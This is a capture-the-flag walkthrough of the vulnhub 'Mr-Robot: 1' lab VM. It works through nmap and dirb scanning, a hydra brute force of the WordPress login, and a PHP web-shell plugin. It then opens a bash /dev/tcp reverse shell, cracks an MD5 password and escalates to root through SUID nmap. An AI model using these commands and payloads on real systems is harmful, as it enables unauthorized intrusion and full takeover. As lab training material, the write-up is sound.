## Brief Description

**Mr-Robot: 1** is one of vulnhub's CTF challenges, based on the favored TV series "Mr. Robot" (which is, by the way, premiering season 2 Wednesday July 13th). There are apparently 3 hidden keys in the VM. Our objective is to locate all 3 keys.

## Let The Hacking Begin!

It goes without saying that we'll start off with a classic `nmap` scan so as to locate our target's IP address and open ports.

> `root@kali:~# nmap -sV -sS 10.10.200.*`

```bash
Nmap scan report for linux (10.10.200.31)
Host is up (0.00030s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd
MAC Address: 08:00:27:82:32:61 (Oracle VirtualBox virtual NIC)
```

There we go. We found both our IP and accessible ports. 

Apparently, ports **80** and **443** are open. Let's fire up our browser!

![Website](mr-robot-1-writeup/website.png)

The website seems to be very well made, with some *real* JavaScript. Pretty cool I must admit. Now let's hack into it!

## KEY-1-OF-3

We'll try some basics first. How about checking out for a `robots.txt` file?

```bash
User-agent: *
fsocity.dic
key-1-of-3.txt
```

BOOM! We just uncovered a dictionary as well as our first key, without even using our cli. Great!

> `http://TARGET_IP/key-1-of-3.txt`

```bash
073403c8a58a1f80d943455fb30724b9
```

Let's save our key and continue hunting. We can use some `wget` magic to download our dictionary file. We'll most probably need it later on.

> `root@kali:~# wget http://10.10.200.31/fsocity.dic`

At this stage, we can use our friend `dirb` so as to uncover any other hidden directories and files. 

> `root@kali:~# dirb http://TARGET_IP/`

```bash
...
+ http://10.10.200.31/sitemap (CODE:200|SIZE:0)                                
+ http://10.10.200.31/sitemap.xml (CODE:200|SIZE:0)                            
==> DIRECTORY: http://10.10.200.31/video/                                      
==> DIRECTORY: http://10.10.200.31/wp-admin/                                   
+ http://10.10.200.31/wp-config (CODE:200|SIZE:0)
...
```

Nice! It seems that we're going to be dealing with some WordPress authentication bruteforce (`/wp-admin/`).

![WordPress Login](mr-robot-1-writeup/wp-login.png)

The error message we get once we enter invalid credentials is `ERROR: Invalid username`. So if we find a valid username, a different error message will be displayed.

Let's see if we can take advantage of that and manually guess a username to save us some time. How about *Elliot*...? Yes! Another ace! (You can also bruteforce it if you don't like guessing.)

All we need to do now is use a tool like `hydra` or `burpsuite` to bruteforce the login form with the `fsocity.dic` file we saved previously. Easy.

It seems that the dictionary consists of 858,160 possible passwords in total. It will definitely take time. 

> `root@kali:~# wc -l fsocity.dic`

```bash
858160 fsocity.dic
```

We can run a `sort uniq` command just to make sure that there aren't any duplicates in our file. As they say, "always trust your gut". 

> `root@kali:~# sort fsocity.dic | uniq > sorted.dic`

> `root@kali:~# wc -l sorted.dic`

```bash
11451 sorted.dic
```

YES! We are down to 11,451 different passes. Certainly saved us some (loads of) time.

It's finally time to commence our bruteforce attack. Open up your most preferred tool and get going. Since I only have the free version of `burpsuite`, which is *significantly* slow, I'll use `hydra`.

> `root@kali:~# hydra 10.10.200.31 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^:incorrect" -l Elliot -P sorted.dic -t 10 -w 30`

```bash
Hydra (http://www.thc.org/thc-hydra) starting at 2016-07-11 10:43:52
[DATA] max 10 tasks per 1 server, overall 64 tasks, 11452 login tries (l:1/p:11452), ~17 tries per task
[DATA] attacking service http-post-form on port 80
[80][http-post-form] host: 10.10.200.31   login: Elliot   password: ER28-0652
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2016-07-11 10:43:55
```

Bullseye! We just gained access to the WordPress platform, with the username **Elliot** and the password **ER28-0652**! Now we'll need to find a way to gain access to the shell. Let's go!

After thinking through my options, I thought it would be painless to create a dead simple plugin which could be used to execute shell commands and thus give us our reverse shell. (You could equally use a php reverse shell script to achieve the same goal; I personally prefer doing it the 'hard', manual way.)

All I need to do is add some typical WordPress plugin info in the beginning of the php file, followed by a php single liner, and we're all set.

```php
<?php
/*
Plugin Name: Shell
Plugin URI: https://nikolaskama.me/
Description: Allows me to own you;)
Author: k4m4
Version: 1.0.0
Author URI: https://nikolaskama.me/
*/

echo shell_exec($_GET['e']);
```

This file is everything we need at this point. We simply have to upload it to the WordPress platform as a new plugin, by navigating to `Plugins > Add New > Upload Plugin`, and then dragging and dropping the file in `zip`, compressed format. You can install [the complete file from here](https://www.dropbox.com/s/7fr9nbfb4rdxgat/shell.php.zip?dl=0).

Once the plugin is successfully installed, you should see this in your browser:

```bash
Installing Plugin from uploaded file: shell.php.zip

Unpacking the package…

Installing the plugin…

Plugin installed successfully.
```

Next, you must activate the plugin by selecting `Activate Plugin`.

If everything is correctly done, we should now be able to execute commands through our url bar! Let's give it a shot! Enter the following in your browser's url:

> `http://TARGET_IP/wp-content/plugins/shell.php_/shell.php?e=whoami`

![whoami](mr-robot-1-writeup/whoami_daemon.png)

Excellent! It works perfectly! Use your browser's *view page source* to be able to clearly see the result. (It should be at the very top of the page - ignore the rest.)

As you can see, we are able to run commands as `daemon`. We now gotta find a way to get reverse shell.

Looking around, a `ls -la` command returned an unusual file named `you-will-never-guess-this-file-name.txt`, intriguing me. I opened up the plaintext file, and all I got was `hello there person who found me`. No luck. I have to try something different.

I tried running a pure bash reverse shell command, and at that point, I realized that some characters ("&" and ">" in this instance) must be encoded in order to avoid execution errors. 
 
I appropriately encoded the two characters using an online encoder, resulting to `%3E%26`. Subsequently, I saved the command with the encoded characters into a file I specified as `reversed.txt` in the `/tmp/` directory. 

The encoded command goes as follows:
> `http://TARGET_IP/wp-content/plugins/shell.php_/shell.php?e=/bin/echo "/bin/bash -i %3E%26 /dev/tcp/LISTENER_IP/443 0%3E%261" > /tmp/reverse.txt`

By writing the reverse command inside a file, we make our lives easier, since we don't overcomplicate the actual execution command - something that will often result to error.

The `/tmp/` directory will nearly always have read, write, and execute privileges, meaning that we will be able to execute our malicious file through that specific directory.

However, once we create the file we only grant it read permissions:

```bash
-rw-r--r-- 1 daemon daemon 47 Jul 12 16:37 /tmp/reverse.txt
```

So, in order for us to be able to run it, we must change the file's permissions, and allow execution with the `chmod 777` standard command.

> `http://TARGET_IP/wp-content/plugins/shell.php_/shell.php?e=chmod 777 /tmp/reverse.txt`

```
-rwxrwxrwx 1 daemon daemon 47 Jul 12 11:52 /tmp/reverse.txt
```

Done! 

I will now use `netcat`, in my kali 2 VM, to listen on port 443.

> `root@kali:~# nc -vlp 443`

All that's left to do at this moment is run the file. So without any further ado, let's get going! 

We must now use `bash` to execute the command, while `netcat` is running in the background.

> `http://TARGET_IP/wp-content/plugins/shell.php_/shell.php?e=/bin/bash /tmp/reverse.txt/`

Once you have finally executed the command, navigate to your listening terminal. 

```bash
10.10.200.31: inverse host lookup failed: Unknown host
connect to [10.10.200.26] from (UNKNOWN) [10.10.200.31] 43420
bash: cannot set terminal process group (11139): Inappropriate ioctl for device
bash: no job control in this shell

daemon@linux:/opt/bitnami/apps/wordpress/htdocs$
```

Woo-hoo! We have full shell access!

Nevertheless, if you run a `whoami` command, you will realize that we are still far behind, considering that we're still running as `daemon`.

## KEY-2-OF-3

Let's take a look at the other users available.

> `daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ cat /etc/passwd`

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
syslog:x:101:104::/home/syslog:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:103:106:ftp daemon,,,:/srv/ftp:/bin/false
bitnamiftp:x:1000:1000::/opt/bitnami/apps:/bin/bitnami_ftp_false
mysql:x:1001:1001::/home/mysql:
varnish:x:999:999::/home/varnish:
robot:x:1002:1002::/home/robot:
```

Hm... Interesting. It seems that there's a `robot` user. Let's navigate to his directory to see if there's anything exciting there.

> `daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ cd /home/robot`
> `daemon@linux:/home/robot$ ls -la`

```bash
...
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

Fabulous! We have found our second key as well as a password hash which we'll obviously need at some point!

Let's save the key and see if we can make any use of the md5 password now.

> `daemon@linux:/home/robot$ cat 2-of-3.txt`

```bash
cat: key-2-of-3.txt: Permission denied
```

Actually, it turns out that we can't save the key since we don't have permission to even read the file it's stored in.

> `daemon@linux:/home/robot$ cat password.raw-md5 `

```bash
robot:c3fcd3d76192e4007dfb496cca67e13b
```

However, I do in fact have access to the md5 file. It appears to be the password for the user `robot` which will most likely lead us to the key.

Let's use our best friend `google` to see if we can find the base10 password, hidden behind the hash.

And of course, google gave us the answer. (You could also use `hashcat` or any other cracking tool if you'd like, instead.) The password is simply the english alphabet. 

![MD5 Decrypted Hash](mr-robot-1-writeup/md5_hash.png)

Now, let's try to login as `robot` with the password we found.

> `daemon@linux:/home/robot/$ su robot`

```bash
su: must be run from a terminal
```

Darn! We got an unexpected error. Don't worry falks! I've got the solution in my pocket. Just run these two simple commands and python will get the job done!

> `daemon@linux:/home/robot/$ echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py`

> `daemon@linux:/home/robot/$ python /tmp/asdf.py`

This error occurred because of the absence of a TTY, but now we're set. Let's give it another shot.

> `daemon@linux:/home/robot/$ su robot`

Once we enter the password `abcdefghijklmnopqrstuvwxyz`, we should be in!

> `robot@linux:~$ id`

```bash
uid=1002(robot) gid=1002(robot) groups=1002(robot)
```

Perfect. As you can see, we are now logged in as `robot`.

> `robot@linux:~$ cat key-2-of-3.txt`

```
822c73956184f694993bede3eb39f959
```

And here's our second key! Brilliant!

## KEY-3-OF-3

Now for the more challenging part... we must find a way to `root`. Let's initially consider our options.

First, we can use `ps axuw` to see if we can take advantage of any commands that had been executed in the past.

Nothing out of the ordinary.

What about SUID files? Let's see.

> `robot@linux:~$ find / -user root -perm -4000 -exec ls -ldb {} \; | grep -v proc`

```bash
...
-rwsr-xr-x 1 root root 155008 Mar 12  2015 /usr/bin/sudo
-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
-rwsr-xr-x 1 root root 440416 May 12  2014 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
...
```

`Nmap` seems to be installed in the VM. Terrific! This can be our way to `root`. Let's try running the commands which should do the trick:

> `robot@linux:~$ nmap --interactive`

```bash
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
```

Nmap's Interactive Mode should work! Let's see!

> `nmap> !sh`

> `# id`

```bash
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
```

AWESOME! We can now execute commands as root!!! It wasn't so demanding after all.

> `# cd /root/`

> `# cat key-3-of-3.txt`

```bash
04787ddef27c3dee1ee161b21670b4e4
```

And here's our last key! 3/3!

You have pretty much reached the end of this writeup! I hope you've enjoyed my walkthrough on this compelling challenge. In fact, it turns out to be my very first! I have attempted to include some brief explanations of the steps I took to reach this final flag. If you have any feedback, I will be more than happy to hear from you! So don't hesitate to email me at **nikolaskam{at}gmail{dot}com**.

Stay tuned for similar walkthroughs and much more coming up in the near future!
